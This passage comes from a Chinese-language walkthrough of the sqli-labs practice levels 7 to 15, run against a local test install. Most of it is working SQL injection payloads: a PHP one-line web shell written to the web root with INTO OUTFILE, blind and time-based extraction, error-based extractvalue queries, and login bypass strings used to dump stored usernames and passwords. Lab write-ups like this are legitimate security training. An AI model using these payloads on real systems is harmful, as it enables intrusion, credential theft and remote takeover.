<p><strong>ps:若无法生成文件，需要将my.ini配置文件中的secure_file_priv选项设置为空，若无该选项则添加设置secure_file_priv=’’</strong></p>
<p><img src="/2019/12/27/sqli-labs-writeup/24.png" alt></p>
<p>测试完成则将一句话木马放进去</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-7/?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_post["mima"]) ?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"D:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\yijuhua.php"</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/25.png" alt></p>
<p>当访问页面时，一句话没有显示</p>
<p><img src="/2019/12/27/sqli-labs-writeup/26.png" alt></p>
<p>然后使用菜刀进行连接。</p>
<h4 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h4><p>通过测试发现<code>or 1=1 -- +</code>返回正常，参考less5的playload进行注入</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- +   //数据库名第一位为s</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>，<span class="number">1</span>，sleep(<span class="number">5</span>)) <span class="comment">-- +  //数据库名第二位为e</span></span><br></pre></td></tr></table></figure>

<p>测试发现可以使用延时注入，并查看less8的源码得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;	</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="comment">//echo 'You are in...........';</span></span><br><span class="line">	<span class="comment">//print_r(mysql_error());</span></span><br><span class="line">	<span class="comment">//echo "You have an error in your SQL syntax";</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>在源码中发现当数据库查询发生错误时，没有输出任何的报错信息，也就是与less5相比，我们无法使用报错注入的方式。其余playload与less5一致。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80 -- + //返回是正确的，测试至101开始报错，说明security库下第一个表的第一个字符为e</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">80</span> <span class="comment">-- +  //返回正确，测试至109报错，得到第二个字符为m</span></span><br><span class="line"></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;80 -- +  //返回正确，测试至114开始报错，说明security下第二个表的第一个字符为r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">and</span> <span class="built_in">column_name</span> regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) <span class="comment">-- +  //查询user表中的列名是否有us**的列</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-8</span>/?id=<span class="number">1</span><span class="string">' and 1=(select 1 from information_schema.columns where table_name='</span>users<span class="string">' and column_name regexp '</span>^usernam<span class="string">e' limit 0,1)-- +  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-8/?id=1'</span> <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>) <span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">-- +   //获取表中的内容，获取username中第一行的第一个字符的ascii，与68进行比较即为D，然后差不多都是直接重复上面换字符位置的查询操作</span></span><br></pre></td></tr></table></figure>

<h4 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h4><p>在连接的标题看到该关卡是关于<strong>基于时间-单引号</strong>的注入方式，明显是需要通过延迟注入，同时将对参数id进行<code>&#39;</code>进行处理。既然前面已经有延时注入的方式，所以这边直接贴playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">猜测数据库名</span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) <span class="comment">-- + //说明第一位是s (ascii为115)</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),2,1))=101,1,sleep(5)) <span class="comment">-- + //说明第二位是e</span></span><br><span class="line">......</span><br><span class="line">以此类推，得到数据库名为security</span><br><span class="line"></span><br><span class="line">猜测security的数据表</span><br><span class="line">http://localhost/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- + //猜测第一个数据表的第一位为e，以此类推得到emails</span></span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-9</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 1,1),1,1))=114,1,sleep(5))-- +  //猜测第二个数据表emails,referers, uagents,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜测users表的列</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-9/?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- +   //猜测users表的第一列的第一个字符是i，然后以此类推得到列名为  id，username，password</span></span><br><span class="line"></span><br><span class="line">猜测username的值</span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-9</span>/?<span class="keyword">id</span>=<span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment">-- +   //猜测username的第一行的第一位   以此类推得到数据库username，password的所有内容</span></span><br></pre></td></tr></table></figure>

<p>上述过程就是通过延时注入的全部过程，当然也可以使用benchmark（）函数进行注入。</p>
<h4 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h4><p>标题提示<strong>基于时间-双引号</strong>，与less9一样，该关卡使用的是延时注入的方式，区别在于less9对id进行的是单引号处理，而这边是使用双引号处理。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测数据库名</span><br><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">10</span><span class="regexp">/?id=1" and if(ascii(substr(database(),1,1))=115,1,sleep(5)) -- +</span></span><br></pre></td></tr></table></figure>

<p>其余的playload参考less9的内容一样</p>
<h4 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h4><p>这边开始要通过post提交数据，post就是将数据从客户端提交到服务器端。例如下面这个界面，通过界面输入用户名和密码，用户名和表单以表单的形式提交，提交到服务器后服务器再进行验证。这就是一个post的过程。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/27.png" alt></p>
<p>进行post注入有两种方式进行，一种是直接在页面进行传输数据，但是这样比较不直观，另一种是使用burpsuite进行报文拦截然后进行修改发送，比较直观。使用burpsuite拦截本地主机报文需要进行设置。(以Google chrome为例)</p>
<ul>
<li><p>在代理插件处将不拦截报文的地址将内容删除</p>
<p><img src="/2019/12/27/sqli-labs-writeup/28.png" alt></p>
</li>
<li><p>将Internet选项中的连接-》局域网设置中的代理服务器进行设置，如下</p>
<p><img src="/2019/12/27/sqli-labs-writeup/29.png" alt></p>
</li>
<li><p>查看本地ip地址，将浏览器中的localhost该ip地址</p>
<p><img src="/2019/12/27/sqli-labs-writeup/30.png" alt></p>
<p><img src="/2019/12/27/sqli-labs-writeup/31.png" alt></p>
</li>
</ul>
<p>就可以使用burpsuite的报文</p>
<p><img src="/2019/12/27/sqli-labs-writeup/32.png" alt></p>
<p>由上面这张图可以看到通过post传输的参数共有三个</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=<span class="number">1</span>&amp;passwd=<span class="number">1</span>&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>其中键入的数据的变量为uname和passwd，通过像get参数传输的注入方式进行post注入，例如：uname:admin’ </p>
<pre><code>passwd:  111(随便输入)</code></pre><p>数据库进行了报错回显，通过报错信息我们发现sql查询语句进行了单引号处理</p>
<p>传入参数：uname:admin’# 密码随意</p>
<p><img src="/2019/12/27/sqli-labs-writeup/33.png" alt></p>
<p>发现直接将用户名密码查询出来了，username：admin  password：admin。当提交username和password后，后台形成的sql语句为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, password <span class="keyword">FROM</span><span class="built_in"> users </span>WHERE <span class="attribute">username</span>=<span class="string">'admin'</span>#' <span class="keyword">and</span> <span class="attribute">password</span>=<span class="string">'$passwd'</span> LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p><strong>#</strong>将admin后面的内容注释掉，而在数据库中包含admin用户名所以语句成立，此时就使用admin进行了登录，然后尝试使用get注入中用到的其他语句进行代替or 1=1进行注入。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">username: <span class="number">1</span>admin'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">database</span>()<span class="meta">#</span></span><br><span class="line">passwd: 任意密码</span><br><span class="line"><span class="comment">//得到数据库名称为security</span></span><br><span class="line"></span><br><span class="line">username: <span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">group_concat</span>(table_name) from information_schema.tables <span class="built_in">where</span> table_schema='security'<span class="meta">#</span></span><br><span class="line">passwd:任意密码</span><br><span class="line"><span class="comment">//得到数据库内的所有表名emails,referers,uagents,user</span></span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="built_in">group_concat</span>(column_name) from information_schema.columns <span class="built_in">where</span> table_name='users'<span class="meta">#</span></span><br><span class="line">passwd：任意</span><br><span class="line"><span class="comment">//得到users表中的列名：id,username,password</span></span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span>admin' <span class="built_in">union</span> <span class="built_in">select</span> username,password from users <span class="built_in">where</span> id=<span class="number">3</span><span class="meta">#</span></span><br><span class="line">passwd:任意密码</span><br><span class="line"><span class="comment">//得到任意用户的用户名和密码</span></span><br></pre></td></tr></table></figure>

<h4 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h4><p>当键入username:admin’      passwd:1 没有任何的报错回显，</p>
<p>尝试双引号，即username：admin”        passwd:1</p>
<p>错误回显发现<strong>1”) LIMIT 0,1</strong>，发现在参数进行了处理将username进行了处理，需要增加<strong>）</strong>。</p>
<p>所以参照less11构造相关的查询语句变量</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">1</span><span class="keyword">admin</span>") union select 1,database()#</span><br><span class="line">passwd:任意</span><br><span class="line">//获得数据库名security</span><br><span class="line"></span><br><span class="line">username:1admin") <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span>#</span><br><span class="line">passwd: 任意</span><br><span class="line">//获得表名emails,referers,uagents,users</span><br><span class="line"></span><br><span class="line">username:<span class="number">1</span><span class="keyword">admin</span>") union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#</span><br><span class="line">passwd:任意</span><br><span class="line">//获得列名id,username,password</span><br><span class="line"></span><br><span class="line">username:1admin") <span class="keyword">union</span> <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span>#</span><br><span class="line">passwd:任意</span><br><span class="line">//可查询所有用户信息</span><br></pre></td></tr></table></figure>

<h4 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h4><p>键入变量值：username: admin’     password:  1(任意)</p>
<p>获得报错信息<strong>1’) LIMIT 0,1</strong>可知是username进行了<strong>‘）</strong>处理，将参数增加<strong>）</strong>进行注入尝试，username: admin’) #  password: 1</p>
<p>发现回显的只有成功登录的信息，没有返回的用户信息，这样就只能使用布尔盲注进行。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="keyword">admin</span><span class="string">') and length(database())=8#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库名长度为8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> left(<span class="keyword">database</span>,<span class="number">1</span>)&gt;<span class="string">'a'</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测数据库名的第一位为s</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">') and left(database(),2)&gt;'</span>sa<span class="string">'#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库的第二位为se</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">逐步猜测数据库名为security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测数据库<span class="keyword">security</span>下第一个表名的第一个字符 第一个应为<span class="number">101</span>-》e</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">') and ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 0,1),2,1))&gt;108#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测数据库security下第一个表名的第二个字符 第二个为108-》m</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">得到数据库security下第一个表名的全程为email</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">113</span>#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//得到数据库<span class="keyword">security</span>下第二个表名的第一个字符 <span class="number">113</span>—》r</span><br><span class="line"></span><br><span class="line">uname=<span class="keyword">admin</span><span class="string">') and 1=(select 1 from information_schema.columns where table_name='</span>users<span class="string">' and table_name regexp '</span>^us[a-z]<span class="string">' limit 0,1)#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//regexp获取users表中的列名，是否有us**列</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">查询出users表中的列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span>) <span class="keyword">and</span> ord(mid((<span class="keyword">select</span> ifnull(cast(username <span class="keyword">as</span> <span class="type">char</span>),<span class="number">0x20</span>)<span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>#</span><br><span class="line">//利用ord()和mid()函数获取users表中的内容，获取username中的第一行的第一个字符的ascii，与<span class="number">68</span>进行比较即为D，而第一行的数据是Dumb。</span><br></pre></td></tr></table></figure>

<h4 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h4><p>使用uname:admin’    passwd:1尝试发现不行，然后使用uname:admin”   passwd:1发现有了报错回显，根据错误显示，对username进行了<strong>”</strong>处理。</p>
<p>uname:admin”#    passwd:1   成功登陆后发现与less13一样，没有用户信息返回，使用盲注的方式就行注入。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname:admin<span class="string">" and length(database())=8#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line"><span class="comment">//测试数据库名长度为8</span></span><br></pre></td></tr></table></figure>

<p>其余参考less13，只需将<strong>‘)</strong>改为<strong>“</strong>就行了</p>
<p>也可使用报错注入的方式。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>:admin" and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select <span class="variable">@@version</span>),<span class="number">0</span>x7e))#</span><br><span class="line"><span class="attribute">passwd</span>:<span class="number">1</span></span><br><span class="line"><span class="comment">//获取数据库版本号</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/34.png" alt></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//获取数据库名security</span><br><span class="line"></span><br><span class="line">uname:admin" <span class="keyword">and</span> rxtractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//获取数据库<span class="keyword">security</span>下的第一个表名为email</span><br><span class="line">//本想回去获取所有表名的，使用<span class="keyword">admin</span>“ <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'users'</span>),<span class="number">0x7e</span>))#</span><br><span class="line">//发现返回的错误是Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="keyword">row</span>并没有获取到相应的信息</span><br><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='users' limit 1,1),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//获取数据库security下第二个表名为referers</span><br><span class="line">......</span><br><span class="line">重复构造相应的轮子至使所有的表格注入出来</span><br><span class="line"></span><br><span class="line">uname:admin" <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>))#</span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//获取users表中第一列的列名id</span><br><span class="line">以此类推，将所有列名注入出来</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span>" and extractvalue(1,concat(0x7e,(select username from users where id=3),0x7e))#</span><br><span class="line">passwd:1</span><br><span class="line">//注出id=3的用户名</span><br><span class="line">uname:admin" <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span>),<span class="number">0x7e</span>))#</span><br><span class="line">//注出id=<span class="number">3</span>的密码</span><br></pre></td></tr></table></figure>

<h4 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h4><p>本关卡通过<code>admin&#39;</code>和<code>admin&quot;</code>进行都没有任何的错误返回，查看源码得到sql查询语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'$uname'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$passwd'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>获知对uname进行单引号处理，同时无法使用报错注入的方式，可以使用延时注入。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">uname:admin' <span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,<span class="built_in">sleep</span>(<span class="number">5</span>))<span class="meta">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">uname；admin' <span class="keyword">and</span> <span class="keyword">if</span>(<span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="built_in">sleep</span>(<span class="number">5</span>))<span class="meta">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line"><span class="comment">//逐步猜测出数据库名为security</span></span><br></pre></td></tr></table></figure>

<p>当正确时可以直接登录，不正确则会延迟5秒</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uname:admin' and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span 